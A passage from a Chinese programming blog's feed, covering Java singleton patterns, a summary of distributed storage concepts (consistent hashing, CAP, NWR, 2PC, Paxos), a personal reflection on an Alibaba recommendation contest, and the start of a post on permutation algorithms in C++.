<p>就我个人而言，一般情况下直接使用饿汉式就好了，如果明确要求要懒加载（lazy initialization）会倾向于使用静态内部类，如果涉及到反序列化创建对象时会试着使用枚举的方式来实现单例。</p>
<h2 id="Read_More">Read More</h2>
<ul>
<li><a href="http://javarevisited.blogspot.sg/2014/05/double-checked-locking-on-singleton-in-java.html" target="_blank" rel="external">Double Checked Locking on Singleton Class in Java</a></li>
<li><a href="http://javarevisited.blogspot.sg/2012/07/why-enum-singleton-are-better-in-java.html" target="_blank" rel="external">Why Enum Singleton are better in Java</a></li>
<li><a href="http://javarevisited.blogspot.com/2012/12/how-to-create-thread-safe-singleton-in-java-example.html" target="_blank" rel="external">How to create thread safe Singleton in Java</a></li>
<li><a href="http://javarevisited.blogspot.com/2011/03/10-interview-questions-on-singleton.html" target="_blank" rel="external">10 Singleton Pattern Interview questions in Java</a></li>
</ul>
]]></content>
    <summary type="html"><![CDATA[<p>单例模式算是设计模式中最容易理解，也是最容易手写代码的模式了吧。但是其中的坑却不少，所以也常作为面试题来考。本文主要对几种单例写法的整理，并分析其优缺点。很多都是一些老生常谈的问题，但如果你不知道如何创建一个线程安全的单例，不知道什么是双检锁，那这篇文章可能会帮助到你。</p>
<h2 id="懒汉式，线程不安全">懒汉式，线程不安全</h2>
<p>当被问到要实现一个单例模式时，很多人的第一反应是写出如下的代码，包括教科书上也是这样教我们的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="code"><pre><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> {</span>
    <span class="keyword">private</span> <span class="keyword">static</span> Singleton instance;
    <span class="keyword">private</span> <span class="title">Singleton</span> (){}

    <span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span>() {
     <span class="keyword">if</span> (instance == <span class="keyword">null</span>) {
         instance = <span class="keyword">new</span> Singleton();
     }
     <span class="keyword">return</span> instance;
    }
}
</pre></td></tr></table></figure>

<p>这段代码简单明了，而且使用了懒加载模式，但是却存在致命的问题。当有多个线程并行调用 getInstance() 的时候，就会创建多个实例。也就是说在多线程下不能正常工作。<br>]]></summary>
    
      <category term="Singleton" scheme="http://wuchong.me/tags/Singleton/"/>
    
      <category term="多线程" scheme="http://wuchong.me/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
      <category term="设计模式" scheme="http://wuchong.me/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
      <category term="双检锁" scheme="http://wuchong.me/tags/%E5%8F%8C%E6%A3%80%E9%94%81/"/>
    
      <category term="程序设计" scheme="http://wuchong.me/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[分布式存储系统 知识体系]]></title>
    <link href="http://wuchong.me/blog/2014/08/07/distributed-storage-system-knowledge/"/>
    <id>http://wuchong.me/blog/2014/08/07/distributed-storage-system-knowledge/</id>
    <published>2014-08-07T06:25:56.000Z</published>
    <updated>2014-12-22T16:18:37.000Z</updated>
    <content type="html"><![CDATA[<p>最近看完了杨传辉老师写的《大规模分布式存储系统》一书，发现里面很多知识点和之前看的《大型网站系统与Java中间件》有很多相通之处，也渐渐加深了我对分布式技术的兴趣。但无奈分布式涵盖范围太广了，分布式存储、分布式计算、CAP理论、Paxos算法、什么GFS、Hadoop、Dynamo、BigTable、Spanner等等，不下点功夫还真不能理顺它们之间的内在关系。所以结合两书以及一些优秀博文，总结了分布式存储的知识体系，为以后打下基础而努力。由于初入泥潭，必然有些理解不当的地方，若有大神路过还望不吝指教。</p>
<p>本文更像是读书笔记，是对知识点的一个梳理，无奈越写越多，部分知识只能点到为止，具体内容可以查看原书或维基百科。</p>
<h2 id="单机存储引擎">单机存储引擎</h2>
<h3 id="哈希">哈希</h3>
<p>哈希存储引擎是哈希表的持久化实现，支持增、删、改，以及随机读取操作，但不支持顺序扫描，对应的存储系统为键值(Key-Value)存储系统，如 Bitcask。它仅支持追加操作，删除也只是通过标识 value 为特殊值，通过定期合并（Compaction）实现垃圾回收。</p>
<h3 id="B_树">B 树</h3>
<p>B 树存储引擎是 B 树的持久化实现，不仅支持单条记录的增、删、读、改操作，还支持顺序扫描，对应的存储系统是关系数据库。关系数据库中通过索引访问数据，在 Mysql InnoDB 中，有一个称为聚集索引的东西，行的数据存于其中，组织成 B+ 树的结构。更多 B 系树的内容可以参考 <a href="http://taop.marchtea.com/03.02.html" target="_blank" rel="external">这里</a> 。</p>
<h3 id="LSM_树">LSM 树</h3>
<p>LSM 树(Log Structure Merge Tree)存储引擎采用批量转储技术来避免磁盘随机写入。其思想很朴素，就是将对数据的修改增量保持在内存中，达到指定的大小限制后将这些修改操作批量写入磁盘。它广泛应用于互联网的后台存储系统， 例如 Google BigTable、 以及 Facebook 开源的 Cassandra系统。<br><a id="more"></a></p>
<h2 id="分布式存储的出现">分布式存储的出现</h2>
<p>单机存储随着业务的增长会遇到<strong>性能</strong>与<strong>单点故障</strong>问题。通常有两种解决方案：</p>
<ol>
<li>数据分布：就是把数据分块存在不同的服务器上（分库分表）。</li>
<li>数据复制：让所有的服务器都有相同的数据，提供相当的服务。</li>
</ol>
<p>这两种方法都能解决性能上的问题，一般结合使用。而对于数据丢失的问题，我们只能通过第二种方法来完成——数据的冗余存储。但是加入更多的机器，会导致事情变得复杂起来，尤其是分布式事务处理，也就是多台服务器之间的数据如何保持一致性，因为原先单机的 ACID 特性在分布式环境下都用不了了。</p>
<h3 id="数据分布">数据分布</h3>
<p>数据分布主要有两种方式：一种是哈希分布，如一致性哈希（Dynamo）；另一种是顺序分布（BigTable）。考虑因素包括读写场景， 即随机还是顺序， 包括如何保证负载均衡从而提高性能等</p>
<p>传统的哈希分布算法简单的将哈希值与服务器个数做除法取模映射。但是当服务器上下线时，数据的重新分布会带来大量的数据迁移。</p>
<p>因此有了 <strong><a href="http://zh.wikipedia.org/zh-cn/%E4%B8%80%E8%87%B4%E5%93%88%E5%B8%8C" target="_blank" rel="external">一致性哈希算法</a></strong> 。算法思想如下 :给系统中每个节点分配一个随机 token，这些 token 构成一个哈希环。执行数据存放操作时，先计算 Key(主键)的哈希值，然后存放到顺时针方向第一个大于或者等于该哈希值的 token 所在的节点。一致性哈希的优点在于节点加入 / 删除时只会影响到在哈希环中相邻的节点，而对其他节点没影响。增加节点后能很大程度上避免了数据迁移。为了考虑负载均衡，一般还会引入虚拟节点的技术，即一个物理节点会对应着多个虚拟节点（如 Dynamo）。</p>
<h3 id="数据复制">数据复制</h3>
<p>复制协议有两种：<strong>强同步复制</strong>，<strong>异步复制</strong>。 区别在于用户的写请求是否需要同步到备副本才可以返回成功。</p>
<p>一致性和可用性是矛盾的。强同步复制协议保证主备副本之间的一致性，但是当备副本出现故障时会影响系统可用性。异步复制协议的可用性较好，但是一致性得不到保障，主副本出现故障时还有数据丢失的可能。</p>
<p>这两种协议都是将主副本的数据以某种形式（多为操作日志）发送到其他副本，这种复制协议称为基于主副本的复制协议。当然还有基于多个存储节点的复制协议。比如下面会介绍的 Dynamo 系统的 NWR 复制协议。</p>
<h3 id="故障检测">故障检测</h3>
<p>设计分布式系统的前提就是假定服务器时刻肯能发生故障。故障检测主要有心跳和租约两种机制。</p>
<ul>
<li>心跳：假设总控机 A 需要确认工作机 B 是否发生故障，那么总控机 A 每隔一段时间，比如 1 秒，向工作机 B 发送一个心跳包。不足之处是若 A 到 B 网络发生故障，则不能确定是否是 B 不再提供服务。</li>
<li>租约：租约机制就是带有超时时间的一种授权。假设机器 A 需要检测机器 B 是否发生故障，机器 A 可以给机器 B 发放租约，机器 B 持有的租约在有效期内才允许提供服务，否则主动停止服务。机器 B 的租约快要到期的时候向机器 A 重新申请租约。租约机制可以解决上述心跳问题的不足。</li>
</ul>
<h2 id="一致性模型">一致性模型</h2>
<p>说起数据一致性，简单说有三种类型（细分会有很多，此处不展开）：</p>
<ol>
<li><strong>弱一致性（Weak）</strong>：当你写入一个新值后，读操作在各个数据副本上不保证能读出最新值。比如：某些cache系统，网络游戏其它玩家的数据和你没什么关系。</li>
<li><strong>最终一致性（Eventually）</strong>：Eventually 是 Weak 的一种特殊情况。当你写入一个新值后，有可能读不出来，但在某个时间窗口之后保证最终能读出来。比如：DNS，电子邮件、Amazon S3，Google搜索引擎这样的系统。</li>
<li><strong>强一致性（Strong）</strong>：新的数据一旦写入，在任意副本任意时刻都能读到新值。比如：文件系统，RDBMS，Azure Table都是强一致性的。</li>
</ol>
<p>从这三种一致型的模型上来说，我们可以看到，Weak 和 Eventually 一般来说是异步冗余的，而Strong一般来说是同步冗余的，异步的通常意味着更好的性能，但也意味着更复杂的状态控制。同步意味着简单，但也意味着性能下降。</p>
<h2 id="分布式事务">分布式事务</h2>
<p>事务的支持对于业务是非常重要的特性，数据库在单机下的 ACID 事务特性是比较到位的，而一旦进行分库分表后就要面对一致性和可用性的问题了，这就是分布式事务了。</p>
<h3 id="CAP_原理">CAP 原理</h3>
<p>在分布式环境下需要考虑数据的一致性和性能的问题，我们要了解下 <a href="http://zh.wikipedia.org/wiki/CAP%E5%AE%9A%E7%90%86" target="_blank" rel="external">CAP 理论</a>：</p>
<ul>
<li>一致性：所有节点在同一时间具有相同的数据。</li>
<li>可用性：保证每个请求不管成功或者失败都有响应。我理解的是系统的性能。</li>
<li>分区容忍性：系统中任意信息的丢失或失败不会影响系统的继续运作。我理解的是系统的抗故障能力。</li>
</ul>
<p>在分布式系统中，对于这三者不能同时满足。这就是 CAP 理论。</p>
<p>简单地说就是：<br>1）要想让数据避免单点故障，就得写多份数据。<br>2）写多份的问题会导致数据一致性的问题。<br>3）数据一致性的问题又会引发性能问题</p>
<h3 id="NWR_模型">NWR 模型</h3>
<p>NWR是一种在分布式存储系统中用于控制一致性级别的策略，应用于 Amazon Dynamo。NWR 模型将 CAP 的选择权交给了用户，由用户自己选择 CAP 中的哪两个。其中，N 代表 N 个备份，W 代表至少写 W 份才认为成功，R 代表至少要读 R 份才认为成功。</p>
<ul>
<li>如果 W+R&gt;N ，是可以保证强一致性的。因为 W+R &gt; N， 所以 R &gt; N-W，什么意思呢？就是读取的份数必须要大于未成功写的份数，这样至少能读到一份最新值。</li>
<li>如果 W+R&lt;=N，则能够保证最终一致性。</li>
<li>如果我们要高可写的环境，我们可以配置 W=1 R=N。这个时候只要写任何节点成功就认为成功，但是读的时候必须从所有的节点都读出数据。</li>
<li>如果我们要求读的高效率，我们可以配置 W=N R=1。这个时候任何一个节点读成功就认为成功，但是写的时候必须写所有三个节点成功才认为成功。</li>
</ul>
<h3 id="两阶段提交">两阶段提交</h3>
<p>英文 Two Phase Commit，也叫 2PC。两阶段提交经常用于分布式事务，是强一致性算法。简要的说就是分两阶段：</p>
<p>第一阶段，主控节点（协调者）询问所有节点（参与者）是否可以提交操作，参与者回应 yes or no。<br>第二阶段，协调者根据收到的响应，如果所有参与者都回应 yes，则向所有参与者发送“正式提交”的命令。参与者完成后恢复“完成”消息，协调者收集齐各节点的回应后结束这个 Global Transaction。如果有一个拒绝则给所有参与者发送“回滚操作”。参与者回滚成功后回应“回滚完成”，协调者收集各结点的“回滚”回应后，取消这个 Global Transaction。</p>
<p>2PC说白了就是第一阶段做 Vote，第二阶段做决定的一个算法，相对于单库事务来说就是在提交之前多了准备的阶段。但是也存在着问题，其中一个是同步阻塞操作，这个事情必然会非常大地影响性能。另一个主要的问题是在TimeOut上。因此出现了 3PC，主要是将提交过程分为两步，更多描述见 <a href="http://en.wikipedia.org/wiki/Three-phase_commit_protocol" target="_blank" rel="external">Wikipedia</a>。</p>
<h3 id="Paxos_算法">Paxos 算法</h3>
<p>Google Chubby 的作者 Mike Burrows 说过，“世上只有一种一致性算法，那就是 Paxos”，所有其他一致性算法都是Paxos算法的残次版本。</p>
<p>Paxos是一个分布式选举算法， 最大的用途就是保持多个节点数据的一致性。看了好久的 Paxos 算法还是有些迷糊，这里就不给出具体算法了。感兴趣的可以参看 <a href="http://zh.wikipedia.org/zh/Paxos%E7%AE%97%E6%B3%95" target="_blank" rel="external">WikiPedia</a> 以及里面给出的示例。</p>
<p>实际上对于一般的开发人员，我们并不需要了解 Paxos 所有细节及如何实现，只需要知道 Paxos 是一个分布式选举算法就够了。当我们以后遇到相似的问题，知道有这样一个技术，可以正确及优雅地解决技术架构上一些难题就够了。</p>
<h3 id="小结">小结</h3>
<p>Paxos 协议和 2PC 协议在分布式系统中所起的作用并不相同。Paxos 协议用于保证同一个数据分片的多个副本之间的数据一致性。当这些副本分布到不同的数据中心时，这个需求尤其强烈。2PC 协议用于保证属于多个数据分片上的操作的原子性。这些数据分片可能分布在不同的服务器上，2PC 协议保证多台服务器上的操作要么全部成功，要么全部失败。可见 Paxos 的学术地位不一般。</p>
<p>Paxos 协议有两种用法:一种用法是用它来实现全局的锁服务或者命名和配置服务，例如 Google Chubby 以及 Apache Zookeeper 还有全局ID。另外一种用法是用它来将用户数据复制到多个数据中心，例如 Google Megastore 以及 Google Spanner。</p>
<p>2PC 协议最大的缺陷在于无法处理协调者宕机问题。如果协调者宕机，那么，2PC协议中的每个参与者可能都不知道事务应该提交还是回滚，整个协议被阻塞，执行过程中申请的资源都无法释放。因此，常见的做法是将 2PC 和 Paxos 协议结合起来，通过2PC 保证多个数据分片上的操作的原子性，通过 Paxos 协议实现同一个数据分片的多个副本之间的一致性。另外，通过 Paxos 协议解决 2PC 协议中协调者宕机问题。当 2PC协议中的协调者出现故障时，通过 Paxos 协议选举出新的协调者继续提供服务。</p>
<p>下图是几种策略原理的比较，来源于：Google App Engine的 co-founder Ryan Barrett在2009年的google i/o上的演讲《<a href="http://snarfed.org/transactions_across_datacenters_io.html" target="_blank" rel="external">Transaction Across DataCenter</a>》（<a href="http://www.youtube.com/watch?v=srOgpXECblk" target="_blank" rel="external">视频</a>）</p>
<p><img src="http://ww4.sinaimg.cn/mw690/81b78497jw1ej3xmerc23j20ss0cstd8.jpg" alt=""></p>
<p>图中 M/S 是 <a href="http://en.wikipedia.org/wiki/Master/slave_(technology" target="_blank" rel="external">Master-Slave</a>) 结构，实现简单，但是存在单点故障和数据丢失的问题。M/M 即 <a href="http://en.wikipedia.org/wiki/Multi-master_replication" target="_blank" rel="external">Multi-Master</a>，解决了单点故障但是一致性的实现较复杂且存在冲突合并的问题（Vector Clock解决）。从上图我们可以看到，我们基本上来说不可以让所有的项都绿起来，也就是之前说到的著名的CAP理论：一致性，可用性，分区容忍性，你只可能要其中的两个。</p>
<h2 id="分布式系统分类">分布式系统分类</h2>
<h3 id="分布式文件系统">分布式文件系统</h3>
<p>分布式文件系统用于存储 Blob 对象，典型的系统有 Facebook Haystack 以及 Taobao File System(TFS)。分布式文件系统是分布式的基石，通常作为上层系统的底层存储。</p>
<p>总体上看，分布式文件系统存储三种类型的数据 :Blob 对象、定长块以及大文件。在系统实现层面，分布式文件系统内部按照数据块(chunk)来组织数据，每个 chunk 的大小大致相同，每个 chunk 可以包含多个 Blob 对象或者定长块，一个大文件也可以拆分为多个 chunk 。</p>
<h3 id="分布式键值系统">分布式键值系统</h3>
<p>分布式键值系统用于存储关系简单的半结构化数据，它只提供基于主键的 CRUD(Create/Read/Update/Delete)功能。</p>
<p>典型的系统有 Amazon Dynamo 以及 Taobao Tair。从数据结构的角度看，分布式键值系统与传统的哈希表比较类似，不同的是，分布式键值系统支持将数据分布到集群中的多个存储节点。分布式键值系统是分布式表格系统的一种简化实现，一般用作缓存，比如淘宝 Tair 以及 Memcache。一致性哈希是分布式键值系统中常用的数据分布技术。</p>
<h3 id="分布式表格系统">分布式表格系统</h3>
<p>分布式表格系统用于存储关系较为复杂的半结构化数据。分布式表格系统以表格为单位组织数据，每个表格包括很多行，通过主键标识一行，支持根据主键的 CRUD 功能以及范围查找功能。</p>
<p>典型的系统包括 Google Bigtable 以及 Megastore，Microsoft Azure Table Storage，Amazon DynamoDB 等。在分布式表格系统中，同一个表格的多个数据行也不要求包含相同类型的列，适合半结构化数据。</p>
<h3 id="分布式数据库">分布式数据库</h3>
<p>分布式数据库一般是从单机关系数据库扩展而来，用于存储结构化数据。分布式数据库采用二维表格组织数据，提供 SQL 关系查询语言，支持多表关联，嵌套子查询等复杂操作，并提供数据库事务以及并发控制。</p>
<p>典型的系统包括 MySQL 数据库分片(MySQL Sharding)集群，Amazon RDS 以及Microsoft SQL Azure。分布式数据库支持的功能最为丰富，符合用户使用习惯，但可扩展性往往受到限制。当然，这一点并不是绝对的。Google Spanner 的扩展性就达到了全球级，它不仅支持丰富的关系数据库功能，还能扩展到多个数据中心的成千上万台机器。除此之外，阿里巴巴 OceanBase  也是一个支持自动扩展的分布式关系数据库。</p>
<h2 id="摘录">摘录</h2>
<p>书中有很多对于分布式的观点对我启发很大，将之引用如下。</p>
<ul>
<li>“Google的分布式存储系统一步步地从 Bigtable 到 Megastore，再到 Spanner，这也验证了分布式技术和传统关系数据库技术融合的必然性，即底层通过分布式技术实现可扩展性，上层通过关系数据库的模型和接口将系统的功能暴露给用户。” OceanBase 正是看准了这两种技术融合的必然性，才走向了可扩展的关系数据库道路。
　　 </li>
<li><p>“简单就是美。系统开发过程中，如果某个方案很复杂，一般是实践者没有想清楚。”。关于这一点其实很早就听说过，就像贯穿UNIX哲学的KISS原则（Keep It Simple,Stupid），而作者通过开发复杂的分布式存储系统过程中得出这么宝贵经验，是“简单就是美”最好的注解。</p>
</li>
<li><p>中心化 VS 去中心。“主流的分布式系统一般都带有中心节点，这样能够简化设计，而且中心节点只维护少量元数据，一般不会成为性能瓶颈。在实践中 Dynamo 及其开源实现 Cassandra 受到的关注逐渐减少，去中心的设计短期内难以成为主流。”</p>
</li>
</ul>
<h2 id="参考资料">参考资料</h2>
<ul>
<li>杨传辉 :<a href="http://book.douban.com/subject/25723658/" target="_blank" rel="external">大规模分布式存储系统</a></li>
<li>酷壳：<a href="http://coolshell.cn/articles/10910.html" target="_blank" rel="external">分布式系统的事务处理</a></li>
</ul>
]]></content>
    <summary type="html"><![CDATA[<p>最近看完了杨传辉老师写的《大规模分布式存储系统》一书，发现里面很多知识点和之前看的《大型网站系统与Java中间件》有很多相通之处，也渐渐加深了我对分布式技术的兴趣。但无奈分布式涵盖范围太广了，分布式存储、分布式计算、CAP理论、Paxos算法、什么GFS、Hadoop、Dynamo、BigTable、Spanner等等，不下点功夫还真不能理顺它们之间的内在关系。所以结合两书以及一些优秀博文，总结了分布式存储的知识体系，为以后打下基础而努力。由于初入泥潭，必然有些理解不当的地方，若有大神路过还望不吝指教。</p>
<p>本文更像是读书笔记，是对知识点的一个梳理，无奈越写越多，部分知识只能点到为止，具体内容可以查看原书或维基百科。</p>
<h2 id="单机存储引擎">单机存储引擎</h2>
<h3 id="哈希">哈希</h3>
<p>哈希存储引擎是哈希表的持久化实现，支持增、删、改，以及随机读取操作，但不支持顺序扫描，对应的存储系统为键值(Key-Value)存储系统，如 Bitcask。它仅支持追加操作，删除也只是通过标识 value 为特殊值，通过定期合并（Compaction）实现垃圾回收。</p>
<h3 id="B_树">B 树</h3>
<p>B 树存储引擎是 B 树的持久化实现，不仅支持单条记录的增、删、读、改操作，还支持顺序扫描，对应的存储系统是关系数据库。关系数据库中通过索引访问数据，在 Mysql InnoDB 中，有一个称为聚集索引的东西，行的数据存于其中，组织成 B+ 树的结构。更多 B 系树的内容可以参考 <a href="http://taop.marchtea.com/03.02.html" target="_blank" rel="external">这里</a> 。</p>
<h3 id="LSM_树">LSM 树</h3>
<p>LSM 树(Log Structure Merge Tree)存储引擎采用批量转储技术来避免磁盘随机写入。其思想很朴素，就是将对数据的修改增量保持在内存中，达到指定的大小限制后将这些修改操作批量写入磁盘。它广泛应用于互联网的后台存储系统， 例如 Google BigTable、 以及 Facebook 开源的 Cassandra系统。<br>]]></summary>
    
      <category term="分布式" scheme="http://wuchong.me/tags/%E5%88%86%E5%B8%83%E5%BC%8F/"/>
    
      <category term="2PC" scheme="http://wuchong.me/tags/2PC/"/>
    
      <category term="Paxos" scheme="http://wuchong.me/tags/Paxos/"/>
    
      <category term="NWR" scheme="http://wuchong.me/tags/NWR/"/>
    
      <category term="系统架构" scheme="http://wuchong.me/categories/%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[阿里推荐大赛：写给这五个月]]></title>
    <link href="http://wuchong.me/blog/2014/07/30/ali-bigdata-competition-write-to-the-5-monthes/"/>
    <id>http://wuchong.me/blog/2014/07/30/ali-bigdata-competition-write-to-the-5-monthes/</id>
    <published>2014-07-30T04:16:45.000Z</published>
    <updated>2014-12-22T16:18:37.000Z</updated>
    <content type="html"><![CDATA[<p>今天早上出完成绩后，其实不怎么想写这篇文章的。因为五个月的努力，最终也没能证明自己。虽然已经不需要前 50 的「校招绿色通道」，但是心里还是会有一些失落。自己劝慰自己「毕竟是一个人单挑」，可是前 50 单挑的也不少。想想还是自己有很多的不足之处，在最终跑融合集的时候，两次脚本参数跑错导致浪费了宝贵的线上机会。而在删除集方面的尝试终于有些效果了，比赛却戛然而止了。</p>
<p>其实在早上看到最终成绩的时候，心情还是比较平静的，我貌似已经淡定地接受了这一切。静静地看着这五个月来的一幕幕如潮水般涌来。</p>
<p>第一次听说这个比赛是在 13 年下半年，一次偶然的机会看到 @得福 做的一次天猫推荐的分享，在那次分享的最后介绍了今年3月份会举办面向高校的推荐大赛。很期待阿里也要举办类似 Netflix 的比赛，而且这次是真正的大数据。</p>
<p>果然在3月初的时候，比赛如期而至，毫不犹豫地报名了。因此也展开了黑白颠倒的五个月。<br><a id="more"></a><br>在报名之初，对于没什么机器学习底子的自己，完全不知道能走多远。第一季报名的队伍如洪水般泛滥，黑科技也层出不穷，摸着石子过河的我完全找不到方向，一度处在一千名开外的位置。后来渐渐找到方法挺进了第二季。</p>
<p>在第二季刚开放的最初几天，迫不及待地进入天池系统一睹真正的大数据。5.7 亿条真实行为记录，1250 万位用户，以及 3 万种品牌。海量的数据跑在 ODPS 平台上，真的非常佩服 ODPS 的技术，处理上亿条的数据秒秒钟的事。当然一开始大家都用的比较温柔，所以比较快，而到最后疯狂的七天也算是体验到什么叫龟速了。ODPS 是一个伟大的产品，因为他不同于以往的 PaaS 、SaaS 服务，ODPS 是一个直接面向计算的云平台。而且现在 ODPS 已经进入了水电模式，像水电一样存在了。ODPS 按照每条 SQL 指令收费，据说整个比赛的费用几乎让主办部门破产，真的非常感谢阿里能免费给我们这个学习环境。</p>
<p>在最初的几天，新鲜感促使我迅速完成了两篇关于 ODPS 的文章，一篇 <a href="http://wuchong.me/blog/2014/04/26/odps-sql-introduction/" target="_blank" rel="external">SQL 入门</a> 一篇 <a href="http://wuchong.me/blog/2014/04/29/odps-sql-build-offline-evaluation/" target="_blank" rel="external">离线评估构建</a> 。这两篇文章帮到了很多同学，也迅速使我的博客日 UV 顺利破千，日 PV 也达到了 1600 之多。后来看到其他小伙伴分享的文章，以及群里聊天的时候，发现好多小伙伴都用的我的评估代码，包括首页的大神们，心里还是挺荣幸的。</p>
<p>分享博客的过程中，让我认识了很多牛人，他们都是对技术有着无比热情的人，能为一个特征一个算法钻研废寝忘食的人。有一位小伙伴，聊着聊着发现我俩的家乡居然就在隔壁城市。</p>
<p>比赛没有留给我耀眼的奖项，但留给我的远比奖项多。比赛期间的孤独无助，毫无进展，熬夜的艰苦多次让我萌生了退堂鼓的念头，但是最后还是坚持了下来，走到了最后。对自己的多次突破，让我相信人的潜力是无限的。从选手们身上对技术的追求也让我学到很多。</p>
<p>写的有点乱，想到哪儿写到哪儿。就这样把，追寻阿里的步伐不会因此而结束，我们校招三面见。</p>
<p>仅以此文献给那些一起拼了五个月的选手们。献给那些日子凌晨 4 点的日出。</p>
<p>最后纪念下换数据前夕充当的华丽的分割线。</p>
<p><img src="http://ww3.sinaimg.cn/large/81b78497jw1ej0idjqiwvj20pu022mx1.jpg" alt=""></p>
<p>-EOF-</p>
]]></content>
    <summary type="html"><![CDATA[<p>今天早上出完成绩后，其实不怎么想写这篇文章的。因为五个月的努力，最终也没能证明自己。虽然已经不需要前 50 的「校招绿色通道」，但是心里还是会有一些失落。自己劝慰自己「毕竟是一个人单挑」，可是前 50 单挑的也不少。想想还是自己有很多的不足之处，在最终跑融合集的时候，两次脚本参数跑错导致浪费了宝贵的线上机会。而在删除集方面的尝试终于有些效果了，比赛却戛然而止了。</p>
<p>其实在早上看到最终成绩的时候，心情还是比较平静的，我貌似已经淡定地接受了这一切。静静地看着这五个月来的一幕幕如潮水般涌来。</p>
<p>第一次听说这个比赛是在 13 年下半年，一次偶然的机会看到 @得福 做的一次天猫推荐的分享，在那次分享的最后介绍了今年3月份会举办面向高校的推荐大赛。很期待阿里也要举办类似 Netflix 的比赛，而且这次是真正的大数据。</p>
<p>果然在3月初的时候，比赛如期而至，毫不犹豫地报名了。因此也展开了黑白颠倒的五个月。<br>]]></summary>
    
      <category term="阿里推荐大赛" scheme="http://wuchong.me/tags/%E9%98%BF%E9%87%8C%E6%8E%A8%E8%8D%90%E5%A4%A7%E8%B5%9B/"/>
    
      <category term="生活" scheme="http://wuchong.me/tags/%E7%94%9F%E6%B4%BB/"/>
    
      <category term="随笔生活" scheme="http://wuchong.me/categories/%E9%9A%8F%E7%AC%94%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[全排列和全组合实现]]></title>
    <link href="http://wuchong.me/blog/2014/07/28/permutation-and-combination-realize/"/>
    <id>http://wuchong.me/blog/2014/07/28/permutation-and-combination-realize/</id>
    <published>2014-07-28T01:41:18.000Z</published>
    <updated>2014-12-22T16:18:37.000Z</updated>
    <content type="html"><![CDATA[<p>记得<a href="http://weibo.com/jeffz" target="_blank" rel="external">@老赵</a>之前在微博上吐槽说，“有的人真是毫无长进，六年前某同事不会写程序输出全排列，昨天发邮件还是问我该怎么写，这时间浪费到我都看不下去了。” 那时候就很好奇全排列到底是什么东西，到底有多难？</p>
<p>今天复习的时候终于碰到这题了，结果果然自己太渣，看了好久都没明白，代码实现又是磕磕碰碰的。所以，就把它整理成笔记加深记忆，也希望能帮到和我一样的人。</p>
<h2 id="全排列">全排列</h2>
<p>所谓全排列，就是打印出字符串中所有字符的所有排列。例如输入字符串<code>abc</code>，则打印出 a、b、c 所能排列出来的所有字符串 <code>abc</code>、<code>acb</code>、<code>bac</code>、<code>bca</code>、<code>cab</code> 和 <code>cba</code> 。</p>
<p>一般最先想到的方法是暴力循环法，即对于每一位，遍历集合中可能的元素，如果在这一位之前出现过了该元素，跳过该元素。例如对于<code>abc</code>，第一位可以是 a 或 b 或 c 。当第一位为 a 时，第二位再遍历集合，发现 a 不行，因为前面已经出现 a 了，而 b 和 c 可以。当第二位为 b 时 ， 再遍历集合，发现 a 和 b 都不行，c 可以。可以用递归或循环来实现，但是复杂度为 $O(n^n)$ 。有没有更优雅的解法呢。</p>
<p>首先考虑<code>bac</code>和<code>cba</code>这二个字符串是如何得出的。显然这二个都是<code>abc</code>中的 a 与后面两字符交换得到的。然后可以将<code>abc</code>的第二个字符和第三个字符交换得到<code>acb</code>。同理可以根据<code>bac</code>和<code>cba</code>来得<code>bca</code>和<code>cab</code>。</p>
<p>因此可以知道 <strong>全排列就是从第一个数字起每个数分别与它后面的数字交换</strong>，也可以得出这种解法每次得到的结果都是正确结果，所以复杂度为 O(n!)。找到这个规律后，递归的代码就很容易写出来了：<br><a id="more"></a></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre></td><td class="code"><pre><span class="preprocessor">#include&lt;stdio.h&gt;</span>
<span class="preprocessor">#include&lt;string&gt;</span>

<span class="comment">//交换两个字符</span>
<span class="keyword">void</span> Swap(<span class="keyword">char</span> *a ,<span class="keyword">char</span> *b)
{
	<span class="keyword">char</span> temp = *a;
	*a = *b;
	*b = temp;
}

<span class="comment">//递归全排列，start 为全排列开始的下标， length 为str数组的长度</span>
<span class="keyword">void</span> AllRange(<span class="keyword">char</span>* str,<span class="keyword">int</span> start,<span class="keyword">int</span> length)
{
	<span class="keyword">if</span>(start == length-<span class="number">1</span>)
	{
		<span class="built_in">printf</span>(<span class="string">"%s\n"</span>,str);
	}
	<span class="keyword">else</span>
	{
		<span class="keyword">for</span>(<span class="keyword">int</span> i=start;i&lt;=length-<span class="number">1</span>;i++)	
		{	<span class="comment">//从下标为start的数开始，分别与它后面的数字交换</span>
			Swap(&str[start],&str[i]); 
			AllRange(str,start+<span class="number">1</span>,length);
			Swap(&str[start],&str[i]); 
		}
	}
}

<span class="keyword">void</span> Permutation(<span class="keyword">char</span>* str)
{
	<span class="keyword">if</span>(str == NULL)
		<span class="keyword">return</span>;

	AllRange(str,<span class="number">0</span>,<span class="built_in">strlen</span>(str));
}

<span class="keyword">void</span> main()
{
	<span class="keyword">char</span> str[] = <span class="string">"abc"</span>;
	Permutation(str);
}
</pre></td></tr></table></figure>

<h2 id="去重的全排列">去重的全排列</h2>
<p>为了得到不一样的排列，可能我们最先想到的方法是当遇到和自己相同的就不交换了。如果我们输入的是<code>abb</code>，那么第一个字符与后面的交换后得到 <code>bab</code>、<code>bba</code>。然后<code>abb</code>中，第二个字符和第三个就不用交换了。但是对于<code>bab</code>，它的第二个字符和第三个是不同的，交换后得到<code>bba</code>，和之前的重复了。因此，这种方法不行。</p>
